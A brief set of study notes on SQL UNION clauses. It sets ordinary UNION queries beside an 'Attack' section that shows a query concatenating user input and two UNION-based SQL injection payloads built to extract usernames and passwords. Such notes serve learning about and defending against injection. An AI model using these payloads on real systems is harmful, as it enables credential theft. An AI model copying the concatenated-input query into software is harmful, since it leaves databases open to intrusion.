## Union Clause

Normal Union :
SELECT * FROM ports UNION SELECT * FROM ships;
SELECT city FROM ports UNION SELECT * FROM ships;

Attack :
SELECT * FROM products WHERE product_id = 'user_input'
SELECT * from products where product_id = '1' UNION SELECT username, password from passwords-- '
SELECT * from products where product_id = '1' UNION SELECT username, 2 from passwords

